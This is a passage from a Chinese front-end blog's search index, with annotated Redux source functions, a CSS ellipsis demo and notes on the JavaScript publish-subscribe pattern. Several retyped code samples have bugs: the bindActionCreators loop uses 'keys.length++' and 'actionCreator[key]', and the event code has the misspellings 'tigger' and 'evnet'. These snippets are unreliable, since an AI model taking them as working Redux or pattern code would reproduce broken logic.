=== 'function') &#123; return bindActionCreator(actionCreators, dispatch); &#125; if (typeof actionCreators !== 'object' || actionCreators === null) &#123; throw new Error( `bindActionCreators expected an object or a function,instead received $&#123;actionCreators === null ? 'null' : typeof actionCreators&#125;` + `Did you write 'import ActionCreators from' instead of 'immport * as ActionCreators from'?`); &#125; const keys = Object.keys(actionCreators); const boundActionCreators = &#123;&#125;; for (let i = 0; i &lt; keys.length++; i++) &#123; const key = keys[i]; const actionCreator = actionCreator[key]; if (typeof actionCreator === 'function') &#123; boundActionCreators[key] = bindActionCreator(actionCreator, dispatch); &#125; &#125; // 为其添加 dispatch 并返回 return boundActionCreators;&#125; compose123456789function compose(...funcs) &#123; if (funcs.length === 0) &#123; return arg =&gt; arg &#125; if (funcs.length === 1) &#123; return funcs[0]; &#125; return funcs.reduce((a, b) =&gt; (...args) =&gt; a(b(...args)));&#125; applyMiddleware12345678910111213141516171819function applyMiddleware(...middlewares) &#123; return (createStore) =&gt; (reducer, preloadedState, enhancer) =&gt; &#123; const store = createStore(reducer, preloadedState, enhancer); let dispatch = store.dispatch; // 定义一个存储中间件函数的列表 let chain = []; const middlewareAPI = &#123; getState: store.getState, dispatch: (action) =&gt; dispatch(action) &#125; // 这里看出 middleware 需要符合一个规则，接受 getState() 和 dispatch 作为参数 chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)) dispatch = compose(...chain)(store.dispatch); return &#123; ...store, // 原来的 store 结构 dispatch // 增强过的 &#125; &#125;&#125; createStore(重点)图解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100function createStore(reducer, preloadedState, enhancer) &#123; // 这里操作表明，可以不传第二个参数，不传默认为 undefined if (typeof preloadedState === 'function' &amp;&amp; typeof enhancer === 'undefined') &#123; enhancer = preloadedState; preloadedState = undefined; &#125; if (typeof enhancer !== 'undefined') &#123; // enhancer 必须是一个函数 if (typeof enhancer !== 'function') &#123; throw new Error('Expected the enhancer to be a function'); &#125; // 如果传递 enhancer,则把 createStore 作为参数传递进去，第三个参数不穿也可以，applymiddleware 中会将 createStore 执行并返回 return enhancer(createStore)(reducer, preloadedState); &#125; if (typeof reducer !== 'function') &#123; throw new Error('Expected the reducer to be a function'); &#125; let currentReducer = reducer; // 当前的state let currentState = preloadedState; // 当前的listeners let currentListeners = []; let nextListeners = currentListeners; // 是否在分发 let isDispatching = false; function ensureCanMutateNextListeners() &#123; if (nextListeners === currentListeners) &#123; nextListeners = currentListeners.slice(); // 浅拷贝 &#125; &#125; function getState() &#123; return currentState; &#125; function subscribe(listener) &#123; if (typeof listener !== 'function') &#123; throw new Error('Expected listener to be a function'); &#125; let isSubscribed = true; ensureCanMutateNextListeners() nextListeners.push(listener); return function unsubscribe() &#123; if (!isSubscribed) &#123; return &#125; isSubscribed = false; ensureCanMutateNextListeners(); const index = nextListeners.indexOf(listener); nextListeners.splice(index, 1); &#125; &#125; function dispatch(action) &#123; // action 必须是一个对象&#123;type:'xxx'&#125; if (!isPlainObject(action)) &#123; throw new Error('Actions must be plain object,Use custom middleware for async actions'); &#125; // 对象必须有 type 属性（唯一确定一个 action，不能重复） if (typeof action.type === 'undefined') &#123; throw new Error('Actions may not have an undefined "type" property.Have you misspelled a constant'); &#125; // 不能同时执行两个 dispatch if (isDispatching) &#123; throw new Error('Reducers may not dispatch actions'); &#125; try &#123; isDispatching = true //不论第一次传入currentState是否有值，都会根据第一次的reducer返回默认值 //比如首次执行createStore就会传入一个几乎不会存在于reducer的case中的类型，这样就可以返回第一次传入reducer的默认值了。 currentState = currentReducer(currentState, action) &#125; finally &#123; //放开dispatch入口 isDispatching = false &#125; const listeners = currentListeners = nextListeners; for (let i = 0; i &lt; listeners.length; i++) &#123; const listener = listeners[i]; listener(); &#125; return action; &#125; function replaceReducer(nextReducer) &#123; if (typeof nextReducer !== 'function') &#123; throw new Error('Expected the nextReducer to be a function'); &#125; currentReducer = nextReducer; dispatch(&#123; type: ActionTypes.INIT &#125;); &#125; // 一个正规的 reducer 都会返回一个默认值，执行这一步 是为了返回 reducer 的默认值 dispatch(&#123; type: ActionTypes.INIT &#125;); return &#123; dispatch, subscribe, getState, replaceReducer &#125;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>redux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS 中省略号的几种写法]]></title>
    <url>%2F2019-02-12-CSS%20%E4%B8%AD%E7%9C%81%E7%95%A5%E5%8F%B7%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95.html</url>
    <content type="text"><![CDATA[CSS 中省略号的几种写法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;省略号的四种写法&lt;/title&gt; &lt;style&gt; p&#123; width: 80%; margin:auto; &#125; .prg&#123; height: 20px; line-height: 20px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; &#125; /* white-space 设置如何处理元素内的空白。 这个属性声明建立布局过程中如何处理元素中的空白符，默认值为 normal normal 默认，空白会被浏览器忽略 pre 空白会被浏览器保留，其行为方式类似 HTML 中的 &lt;pre&gt; 标签 nowrap 文本不会换行，文本会在同一行上继续，知道遇到 &lt;br&gt; 标签为止 pre-wrap 保留空白符序列，但是正常地进行换行 pre-line 合并空白符序列，但是保留换行符 inherit 规定应该从父元素继承 white-space 属性的值 text-overflow 规定当文本溢出包含元素时发生的事情 默认值为 clip clip 修剪文本 elipsis 显示省略符号来代表被修剪的文本 string 使用给定的字符串来代表被修剪的文本 */ .prg1&#123; position: relative; overflow: hidden; text-overflow: ellipsis; height: 60px; line-height: 20px; &#125; .prg1::after&#123; content: '...'; padding-left: 3px; position: absolute; top: 20px; left: 0; display: block; height: 20px; width: 20px; background: #fff; &#125; .prg2&#123; display: -webkit-box; -webkit-box-orient:vertical; overflow: hidden; text-overflow: ellipsis; -webkit-line-clamp:1; &#125; /* -webkit-line-clamp 是一个不规范的属性，还没有出现在 CSS 规范草案中 限制一个块元素显示的文本行数，为了实现该效果，它需要组合其他外来的Webkit属性， 常见的属性：display:-webkit-box; 必须结合的属性，将对象作为弹性伸缩盒子模型显示 -webkit-box-orient 必须结合的属性，设置或检索伸缩盒对象的子元素的排列方式 text-overflow 可以用来多行文本的情况下，用省略号... 隐藏超出范围的文本。 */ &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;单行省略...&lt;/h3&gt; &lt;p class="prg"&gt;前端技术一般分为前端设计和前端开发，前端设计一般可以理解为网站的视觉设计，前端开发则是网站的前台代码实现，包括基本的HTML和CSS以及JavaScript/ajax，现在最新的高级版本HTML5、CSS3，以及SVG等。&lt;/p&gt; &lt;h3&gt;多行省略...&lt;/h3&gt; &lt;p class="prg1"&gt;前端技术一般分为前端设计和前端开发，前端设计一般可以理解为网站的视觉设计，前端开发则是网站的前台代码实现，包括基本的HTML和CSS以及JavaScript/ajax，现在最新的高级版本HTML5、CSS3，以及SVG等。&lt;/p&gt; &lt;h3&gt;多行省略...&lt;/h3&gt; &lt;p class="prg2"&gt;前端技术一般分为前端设计和前端开发，前端设计一般可以理解为网站的视觉设计，前端开发则是网站的前台代码实现，包括基本的HTML和CSS以及JavaScript/ajax，现在最新的高级版本HTML5、CSS3，以及SVG等。&lt;/p&gt; &lt;h3&gt;多行省略...&lt;/h3&gt; &lt;p class="prg3"&gt;前端技术一般分为前端设计和前端开发，前端设计一般可以理解为网站的视觉设计，前端开发则是网站的前台代码实现，包括基本的HTML和CSS以及JavaScript/ajax，现在最新的高级版本HTML5、CSS3，以及SVG等。&lt;/p&gt;&lt;/body&gt;&lt;script&gt; (function (w) &#123; const shortLine = function (pragrafsClass, number) &#123; const prgs = document.getElementsByClassName(pragrafsClass); for (let i = 0; i &lt; prgs.length; i++) &#123; let contents = prgs[i].textContent; if (contents.length &gt;= number) &#123; let strs = contents.slice(0, number) prgs[i].textContent = strs + "..." &#125; &#125; &#125; w.shortLine = shortLine &#125;)(window) window.shortLine('prg3',18) &lt;/script&gt; &lt;/html&gt;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——发布-订阅模式]]></title>
    <url>%2F2019-01-29-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%8F%91%E5%B8%83-%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——发布-订阅模式发布-订阅模式又叫做观察者模式，它定义对象间的一种一对多的依赖关系，当一个对象的状态发生变化时，所有依赖于它的对象都将得到通知。在 JavaScript 开发中，我们一般用事件模型来替代传统的发布-订阅模式。 现实中的发布-订阅模式小明最近看上了一套房子，到了售楼处之后才被告知，楼盘的房子都被买完了。好在售楼的工作人员告诉他，不久后还有一些尾盘推出，开发商正在办理手续，办好后就可以购买了，但是具体时间还不知道。 于是小明记下来售楼处的电话，以后每天都打电话过去问是不是到了够买的时间。除了小明，还有其他人也会每天打电话问这个问题。一个星期过后，售楼工作人员决定辞职，因为厌倦了每天回答 1000 个相同内容的电话。 当然现实中没有这么笨的销售公司，实际上故事是这样的：小明离开之前，把电话号码留在了售楼处。售楼工作人员答应他，新楼盘一推出就马上发信息通知小明。小红、小强和小龙也是一样，他们的电话号码都被记在售楼处的花名册上，新楼盘推出的时候，售楼 MM 会翻开花名册，遍历上面的电话号码，依次发送一条短信来通知他们。 发布-订阅模式的作用在刚刚的例子中，发送短信通知就是一个典型的发布-订阅模式，购买者就是订阅者，他们订阅了房子开售的消息。售楼处作为发布者，会在合适的时候遍历花名册上的电话号码，依次给购房者发布消息。 可以发现，在这个例子中使用发布-订阅模式有着显而易见的优点。 购房者不用再天天给售楼处打电话咨询开售时间，在合适的时间点，售楼处作为发布者会通知这些消息订阅者 购房者和售楼处之间不再强耦合在一起，当有新的购房者出现时，他只需把手机号码留在售楼处，售楼处不关心购房者的任何情况，不管购房者是男是女还是一只猴子。 而售楼处的任何变动也不会影响购买者，比如售楼 MM 离职，售楼处从一楼搬到二楼，这些改变都跟购房者无关，只要售楼处记得发短信这件事情。 第一点说明这个模式可以广泛应用于异步编程中，这是一种替代回调函数的方案。比如，我们订阅 ajax 请求的 error,succ 等事件。或者如果想在动画的每一帧完成之后做一些事情，那我们可以订阅一个事件，然后在动画的每一帧完成之后发布这个事件。在异步编程中使用发布-订阅模式，我们就无需过多关注对象在异步运行期间的内部状态，而只需要订阅感兴趣的事件发生点。 第二点说明这个模式可以取代对象之间硬编码的通知机制，一个对象不用显式地调用另一个对象的某个接口。这个模式让两个对象松耦合地联系在一起，虽然不太清除彼此的细节，但这部影响它们之间的互相通信。当有新的订阅者出现时，发布者的代码不需要任何修改，同样发布者需要改变时，也不会影响到之前的订阅者。只要之前的约定的事件没有变化，就可以自由改变它们。 DOM 事件实际上，只要我们曾经在 DOM 节点上面绑定过事件函数，我们就曾经使用过 发布-订阅模式，来看看下面的代码 12345document.body.addEventListener('click',function()&#123; console.log(2);&#125;,false)document.body.click(); // 模拟用户点击 在这里需要监控用户点击 document.body 的动作，但是我们没有办法预知用户将在什么时候点击。所以我们订阅 document.body 上的 click 事件，当 body 节点被点击的时候，body 节点便会向订阅者发布这个消息。这很像购房的例子，购房者不知道房子什么时候开始出售，于是他在订阅消息后等待售楼处发布消息。 当然我们还可以随意增加或者是删除订阅者，增加订阅者不会影响发布者代码的编写： 12345678910111213document.body.addEventListener('click',function()&#123; console.log(2);&#125;,false)document.body.addEventListener('click',function()&#123; console.log(3);&#125;,false)document.body.addEventListener('click',function()&#123; console.log(4);&#125;,false)document.body.click(); // 模拟用户点击 注意，手动触发事件更好的做法是 IE 下用 fireEvent，标准浏览器下用 dispatchEvent 实现。 自定义事件除了 DOM 事件，我们还经常实现一些自定义的事件，这种依靠自定义事件完成的发布-订阅模式可以用于任何 JavaScript 代码中。 看看如何实现发布-订阅模式 首先要指定好谁充当发布者（例如售楼处） 然后给发布者添加一个缓存列表，用于存放回调函数以便于通知订阅者（售楼处的花名册） 最后发布消息的时候，发布者会遍历这个缓存列表，依次触发里面存放的订阅者的回调函数（遍历花名册，挨个发短信） 另外，我们还可以往回调函数里面填入一些参数，订阅者可以接受这些参数。这很有必要，比如售楼处可以在发送给订阅者的短信里面添加上房子的单价、面积等等消息，订阅者可以接受这些消息后进行各自的处理： 123456789101112131415161718192021222324var salesOffices = &#123;&#125;; // 定义售楼处salesOffices.clientList = []; // 缓存列表，存放订阅者的回调函数salesOffices.listen = function(fn)&#123; // 增加订阅者 this.clientList.push(fn); // 订阅的消息添加进缓存列表&#125;salesOffices.trigger = function()&#123; // 发布消息 for(var i=0,fn;fn=this.clientList[i++];)&#123; fn.apply(this,arguments); // arguments 是发布消息时带上的参数 &#125;&#125;// 测试salesOffices.listen(function(price,squareMeter)&#123; // 小明订阅消息 console.log('价格=',price); console.log('squareMeter=',squareMeter);&#125;);salesOffices.listen(function(price,squareMeter)&#123; // 小红订阅消息 console.log('价格=',price); console.log('squareMeter=',squareMeter);&#125;);salesOffices.trigger(20000,88);salesOffices.trigger(30000,100); 至此，实现了一个简单的发布-订阅模式，但这里还存在一些问题，我们看到订阅者接收到了发布者发布的每个消息，虽然小明只想买88平方的，但是发布者也把100平方的消息推给了他。这对小明来说是不小的困扰。我们可以通过增加一个 标识 key 让订阅者只订阅自己感兴趣的消息。 12345678910111213141516171819202122232425262728293031var salesOffices = &#123;&#125;; // 定义售楼处salesOffices.clientList = &#123;&#125;; // 缓存列表，存放订阅者的回调函数salesOffices.listen = function(key,fn)&#123; // 如果还没有订阅此类消息，给此类消息创建一个缓存列表 if(!this.clientList[key])&#123; this.clientList[key] = []; &#125; this.clientList[key].push(fn); // 订阅的消息添加进缓存列表&#125;salesOffices.trigger = function()&#123; // 发布消息 var key = Array.prototype.shift.call(arguments), // 取出消息类型 fns = this.clientList[key]; // 取出该消息对应的回调函数集合 if(!fns || fns.length === 0)&#123; // 如果没有订阅此消息，则返回 return false; &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); // arguments 是发布消息时带上的参数 &#125;&#125;// 测试salesOffices.listen('squareMeter88',function(price)&#123; // 小明订阅消息 console.log('价格=',price); &#125;);salesOffices.listen('squareMeter100',function(price)&#123; // 小红订阅消息 console.log('价格=',price);&#125;);salesOffices.trigger('squareMeter88',20000);salesOffices.trigger('squareMeter100',30000); 很明显，订阅者现在可以订阅自己喜欢的事件了。 发布-订阅模式的通用实现把 发布-订阅的功能提取出来，放在单独一个对象中内： 12345678910111213141516171819202122232425262728293031323334353637383940var event = &#123; clientList:[], listen:function(key,fn)&#123; if(!this.clientList[key])&#123; this.clientList[key] = []; &#125; this.clientList[key].push(fn); &#125;, trigger:function()&#123; var key = Array.prototype.shift.call(arguments), fns = this.clientList[key]; if(!fns || fns.length === 0)&#123; return false; &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); &#125; &#125;&#125;// 然后定义一个 installEvent 函数，这个函数可以给所有的对象都动态安装发布-订阅功能var installEvent = function(obj)&#123; for(var i in event)&#123; obj[i] = event[i]; &#125;&#125;// 测试var salesOffices = &#123;&#125;;installEvent(salesOffices);console.log(salesOffices);salesOffices.listen('squareMeter88',function(price)&#123; // 小明订阅消息 console.log('价格=',price); &#125;);salesOffices.listen('squareMeter100',function(price)&#123; // 小红订阅消息 console.log('价格=',price);&#125;);salesOffices.trigger('squareMeter88',20000);salesOffices.trigger('squareMeter100',30000); 取消订阅的事件给 event 对象 增加一个 remove 方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556var event = &#123; clientList:[], listen:function(key,fn)&#123; if(!this.clientList[key])&#123; this.clientList[key] = []; &#125; this.clientList[key].push(fn); &#125;, trigger:function()&#123; var key = Array.prototype.shift.call(arguments), fns = this.clientList[key]; if(!fns || fns.length === 0)&#123; return false; &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); &#125; &#125;, remove:function(key,fn)&#123; var fns = this.clientList[key]; if(!fns)&#123; // 如果 key 对应的 消息没有被人订阅，则直接返回 return false; &#125; if(!fn)&#123; // 如果没有传入具体的回调函数，表示需要取消 key 对应消息的所有订阅 fns &amp;&amp; (fns.length =0); &#125;else&#123; for(var l = fns.length-1; l&gt;=0;l--)&#123; // 反向遍历订阅的回调函数列表 var _fn = fns[l]; if(_fn === fn)&#123; fns.splice(l,1); // 删除订阅者的回调函数 &#125; &#125; &#125; &#125;&#125;// 然后定义一个 installEvent 函数，这个函数可以给所有的对象都动态安装发布-订阅功能var installEvent = function(obj)&#123; for(var i in event)&#123; obj[i] = event[i]; &#125;&#125;// 测试var salesOffices = &#123;&#125;;installEvent(salesOffices);salesOffices.listen('squareMeter88',fn1 = function(price)&#123; // 小明订阅消息 console.log('价格=',price); &#125;);salesOffices.listen('squareMeter100',fn2 = function(price)&#123; // 小红订阅消息 console.log('价格=',price);&#125;);salesOffices.remove('squareMeter88',fn1); // 删除小明订阅salesOffices.trigger('squareMeter88',20000); // 没有输出salesOffices.trigger('squareMeter100',30000); 真实的例子——网络登录假如我们正在开发一个商城网站，网站里有 header 头部、nav 导航、消息列表、购物车等模块。这几个模块的渲染有一个共同的前提条件，就是必须先用 ajax 异步请求获取用户的登录信息。比如用户的名字和头像要显示在 header 模块里，而这两个字段都来自用户登录后返回的信息。 至于 ajax 请求什么时候能成功返回用户信息，这点我们没有办法确定。现在的情节看起来像极了售楼处的例子，小明不知道什么时候开发商的售楼手续能够成功办下来 但现在还不足以说服我们在此使用发布—订阅模式，因为异步的问题通常也可以用回调函数来解决。更重要的一点是，我们不知道除了 header 头部、nav 导航、消息列表、购物车之外，将来还有哪些模块需要使用这些用户信息。如果它们和用户信息模块产生了强耦合，比如下面这样的形式： 123456login.succ(function(data)&#123; header.setAvatar(data.avatar); // 设置 header 模块的头像 nav.setAvatar(data.avatar); // 设置导航模块的头像 message.refresh(); // 刷新消息列表 cart.refresh(); // 刷新购物车列表&#125;); 现在登录模块是我们负责编写的，但我们还必须了解 header 模块里设置头像的方法叫setAvatar、购物车模块里刷新的方法叫 refresh，这种耦合性会使程序变得僵硬，header 模块不能随意再改变 setAvatar 的方法名，它自身的名字也不能被改为 header1、header2。 这是针对具体实现编程的典型例子，针对具体实现编程是不被赞同的。 等到有一天，项目中又新增了一个收货地址管理的模块，这个模块本来是另一个同事所写的。但是他却不得不给你打电话：“Hi，登录之后麻烦刷新一下收货地址列表。”于是你又翻开你 3 个月前写的登录模块，在最后部分加上这行代码： 1234567login.succ(function(data)&#123; header.setAvatar(data.avatar); // 设置 header 模块的头像 nav.setAvatar(data.avatar); // 设置导航模块的头像 message.refresh(); // 刷新消息列表 cart.refresh(); // 刷新购物车列表 address.refresh(); // 增加的代码&#125;); 我们就会越来越疲于应付这些突如其来的业务要求，要么跳槽了事，要么必须来重构这些代码。 用发布-订阅模式重写之后，对用户消息感兴趣的业务模块进行自定订阅登录成功的消息事件。当登录成功后，登录模块只需要发布登录成功的消息，而业务放接受到消息之后，就会开始进行各自的业务处理，登录模块并不关心业务方究竟需要什么，也不想去了解它的内部细节。改善后的代码： 12345678910111213141516171819202122232425$.ajax('http://laibh.top?login',function(data)&#123; login.trigger('loginSucc',data); // 发布登录成功的消息&#125;);// 各自模块监听登录成功的消息var header = (function()&#123; login.listen('loginSucc',function(data)&#123; header.setAvatar(data.avatar); &#125;); return&#123; setAvatar:function(avatar)&#123; console.log('设置 header 模块的头像'); &#125; &#125;&#125;)();var nav = (function()&#123; login.listen('loginSucc',function(data)&#123; nav.setAvatar(data.avatar); &#125;); return&#123; setAvatar:function(avatar)&#123; console.log('设置 nav 模块的头像'); &#125; &#125;&#125;)() 如上所述，我们随时可以把 setAvatar 的方法改成其他的，如果有天登录完成之后，又增加一个刷新收货地址列表的行为，那么只要在收货地址模块里面加上监听消息的方法就可以了。而这可以让开发该模块的同事自己完成，作为登录模块的开发者，永远不用再关心这些行为了。 12345678910var address = (function()&#123; login.listen('loginSucc',function(obj)&#123; address.refresh(obj); &#125;); return&#123; refresh:function(avatar)&#123; console.log('刷新收货地址列表'); &#125; &#125;&#125;)() 全局的发布-订阅对象会想刚刚实现的发布-订阅模式，我们给售楼对象和登录对象都添加了订阅和发布的功能。其实这里还有两个小问题： 我们给每一个发布者对象都添加了 listen 和 trigger 方法，以及一个缓存对象 clientList ，这里其实是一种资源浪费。 小明跟售楼处对象还是存在一定的耦合性，小明至少要知道售楼处对象的名字是 salesOffices 才能顺利的订阅到事件 123salesOffice.listen('squareMeter100',function(price)&#123; console.log('价格：',price);&#125;); 如果小明还关心300平方米的房子，而这套房子的卖家是 salesOffices2 ，这意味着小明要开始订阅 salesOffices2 对象： 123salesOffice2.listen('squareMeter300',function(price)&#123; console.log('价格：',price);&#125;); 其实在现实中，买房子未必要去到售楼处，我们只要把订阅消息的请求转交给中介公司，而各大房产公司也只需要通过中介公司来发布房子消息。这样一来，我们就不用关心消息是来自哪个房产公司，我们在意的是是否能够顺利收到消息。当然，为了保证订阅者和发布者能顺利通信，订阅者和发布者都必须知道这个中介公司。 同样在程序 中，发布-订阅模式可以用一个全局的 Event 对象来实现，订阅者不需要了解消息来自哪个发布者，发布者也不知道消息会推送哪个订阅者，Event 作为一个类似“中介者”的角色，把订阅者和发布者联系起来。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849var Event = (function()&#123; var clientList = &#123;&#125;, listen, tigger, remove; listen = function(key,fn)&#123; if(!clientList[key])&#123; clientList[key] = [] &#125; clientList[key].push(fn); &#125;; trigger = function()&#123; var key = Array.prototype.shift.call(arguments), fns = clientList[key]; if(!fns || fns.length === 0)&#123; return false &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); &#125; &#125;; remove = function(key,fn)&#123; var fns = clientList[key]; if(!fns)&#123; return false &#125; if(!fn)&#123; fns &amp;&amp; (fns.length = 0) &#125;else&#123; for(var l = fns.length-1;l&gt;=0;l--)&#123; var _fn = fns[l]; if(_fn === fn)&#123; fns.splice(l,1); &#125; &#125; &#125; &#125;; return&#123; listen:listen, trigger:trigger, remove:remove, &#125; &#125;)();Event.listen('squareMeter88',function(price)&#123; // 订阅消息 console.log('价格：',price);&#125;);Event.trigger('squareMeter88',200000); /// 售楼处发布消息 模块间通信上面的实现发布-订阅模式的实现，是基于一个全局的 Event 对象，我们利用它可以在两个封装良好的模块中通信，这两个模块可以完全不知道对方的存在。就如同有了中介公司一样，我们不再需要房子出售的消息来自哪个售楼处。 比如现在有两个模块，a模块中有一个按钮，每次点击按钮之后，b模块中的 div 中会显示按钮的总点击次数，我们用全局的发布-订阅模式完成下面的代码，使得 a 模块和 b 模块可以在保持封装性的前提下进行通信： 12&lt;button id="count"&gt;点我&lt;/button&gt;&lt;div id="show"&gt;&lt;/div&gt; 1234567891011121314var a = (function()&#123; var count = 0; var button = document.getElementById('count'); button.onClick = function()&#123; Event.trigger('add',count++); &#125;&#125;)()var b = (function()&#123; var div = document.getElementById('show'); Event.listen('add',function(count)&#123; div.innerHTML = count; &#125;);&#125;)() 但是在这里我们要留意另一个问题，模块之间用了太多的全部发布-订阅模式来通信，那么模块与模块之间的联系就被隐藏到了背后。我们最终会搞不清楚消息来自哪个模块，或者消息会流向哪些模块，这又会给我们的维护带来一些麻烦，也许某个模块的作用就是暴露一些接口给其他模块调用。 必须先订阅再发布吗我们所了解的发布-订阅模式，都是订阅者必须先订阅一个消息，随后才能接受到发布者发布的消息，如果把顺序反过来，发布者先发布一条消息，而在此之前没有对象来订阅它，这条消息无疑将消失在宇宙中。 在某些情况下，我们需要先将这条消息保存下来，等到有对象来订阅它的时候，再重新把消息发布给订阅者。就同 QQ 消息中的离线消息一样，离线消息被保存在服务器中，接收人不下次登录上线之后，可以重新接受这条消息。这种需求在实际项目中是存在的，比如在之前的商城网站中，获取到用户消息之后才能渲染用户导航模块，而获取用户消息的操作是一个 ajax 异步请求，当 ajax 请求成功返回之后会发布一个事件，在此之前订阅了 这个事件的用户导航模块可以接收这些用户信息。 但是这只是理想的状况，因为异步的原因，我们不能保证 ajax 请求返回的时间，有时候它返回得比较快，而此时用户导航模块的代码还没有加载好（还没有订阅对应的事件），特别是在用了一些模块化惰性加载的技术后，这是很有可能发生的事情。也许我们还需要一个方案，使得我们的发布-订阅模式拥有先发布后订阅的功能。 为了满足这个需求，我们要建立一个存放离线事件的堆栈，当事件发布的时候，如果此时还没有订阅者来订阅这个事件，我们暂时把发布事件的动作包裹在一个函数里面，这些包装函数将被存入堆栈中，等到终于有对象来订阅此事件的时候，我们将遍历堆栈并且依次执行这些包装函数，也就是重新发布里面的事件。当然离线事件的生命周期只有一次，就像QQ 的未读消息只会重新阅读一次，所以刚才的操作我们只能进行一次。 全局事件的命名冲突全局的发布-订阅对象里只有一个 clientList 来存放消息名和回调函数，大家都通过它来订阅和发布各种消息，久而久之，难免会出现事件名冲突的情况，所以我们还可以给 Event 对象提供创建命名空间的功能。 在提供代码之前，先感受一下怎么使用这两个新增的功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142// 先发布后订阅Event.trigger('click',1);Event.listen('click',function(a)&#123; console.log(a); // 输出：1&#125;);// 使用命名空间Event.create('namespace1').listen('click',function(a)&#123; console.log(a); // 1&#125;);Event.create('namespace1').trigger('click',1);Event.create('namespace2').listen('click',function(a)&#123; console.log(a); // 1&#125;);Event.create('namespace2').trigger('click',2);// 具体的实现代码var Event = (function()&#123; var global = this, Event, _default = 'default'; Event = function()&#123; var _listen, _trigger, _remove, _slice = Array.prototype.slice, _shift = Array.prototype.shift, _unshift = Array.prototype.unshift, namespaceCache = &#123;&#125;, _create, find, each = function(ary,fn)&#123; var ret; for(var i=0,l=ary.length;i&lt;l;i++)&#123; var n = ary[i]; ret = fn.call(n,i,n); &#125; return ret; &#125;; _listen = function(key,fn,cache)&#123; if(!cache[key])&#123; cache[key] = []; &#125; cache[key].push(fn); &#125;; _trigger = function()&#123; var cache = _shift.call(arguments), key = _shift.call(arguments), args = arguments, _self = this, ret, stack = cache[key]; if(!stack || !stack.length)&#123; return; &#125; return each(stack,function()&#123; return this.apply(_self,args); &#125;); &#125;; _remove = function(key,cache,fn)&#123; if(cache[key])&#123; if(fn)&#123; for(var i=cache[key].length;i&gt;=0;i--)&#123; if(cache[key][i] === fn)&#123; cache[key].splice(i,1); &#125; &#125; &#125;else&#123; cache[key] = []; &#125; &#125; &#125;; _create = function(namespace)&#123; var namespace = namespace || _default; var cache = &#123;&#125;, offlineStack = [], // 离线事件 ret = &#123; listen:function(key,fn,last)&#123; _listen(key,fn,cache); if(offlineStack === null)&#123; return; &#125; if(last === 'last')&#123; offlineStack.length &amp;&amp; offlineStack.pop()(); &#125;else&#123; each(offlineStack,function()&#123; this(); &#125;); &#125; offlineStack = null; &#125;, one:function(key,fn,last)&#123; _remove(key,cache); this.listen(key,fn,last); &#125;, remove:function(key,fn)&#123; _remove(key,cache,fn); &#125;, trigger:function()&#123; var fn, args, _self = this; _unshift.call(arguments,cache); args = arguments; fn = function()&#123; return _trigger.apply(_self,args); &#125;; if(offlineStack)&#123; return offlineStack.push(fn); &#125; return fn(); &#125; &#125;; return namespace ? (namespaceCache[namespace]? namespaceCache[namespace]:namespaceCache[namespace] = ret):ret; &#125;; return &#123; create:_create, one:function(key,fn,last)&#123; var event = this.create(); event.one(key,fn,last); &#125;, remove:function(key,fn)&#123; var evnet = this.create(); event.remove(key,fn); &#125;, listen:function(key,fn,last)&#123; var event = this.create(); event.listen(key,fn,last); &#125;, trigger:function()&#123; var event = this.create(); event.trigger.apply(this,arguments); &#125; &#125;; &#125;(); return Event;&#125;)() JavaScript 实现的发布-订阅模式的便利性在 JAVA 中实现一个自己的发布-订阅模式，通常会把订阅者对象自身当做引用传入发布者对象中，同时订阅者对象还需要提供一个名为诸如 update 的方法，供发布者对象在适合的时候调用。而在 JavaScript 中，我们用注册回调函数的形式来替代传统的发布-订阅模式，显得更加优雅和简单。 另外，在 JavaScript 中无需选择去使用推模型还是拉模型，推模型是指在事件发生时，发布者一次性把所有更改的状态和数据都推送给订阅者。拉模型不同的是，发布者仅仅通知订阅者事件已经发生了，此外发布者要提供一些公开的接口供订阅者来主动拉取数据。拉模型的好处是让订阅者“按需拉取”，但同时有可能让发布者成为一个“门户大开”的对象，同时增加了代码量和复杂度。 在 JavaScript 中，arguments 可以很方便地表示参数列表，所以我们一般会选择推模型，使用 Function.prototype.apply 把所有的数据都推给订阅者。 小结本章我们学习了发布—订阅模式，也就是常说的观察者模式。发布—订阅模式在实际开发中非常有用。 发布—订阅模式的优点非常明显，一为时间上的解耦，二为对象之间的解耦。它的应用非常广泛，既可以用在异步编程中，也可以帮助我们完成更松耦合的代码编写。发布—订阅模式还可以用来帮助实现一些别的设计模式，比如中介者模式。从架构上来看，无论是 MVC 还是 MVVM，都少不了发布—订阅模式的参与，而且 JavaScript 本身也是一门基于事件驱动的语言. 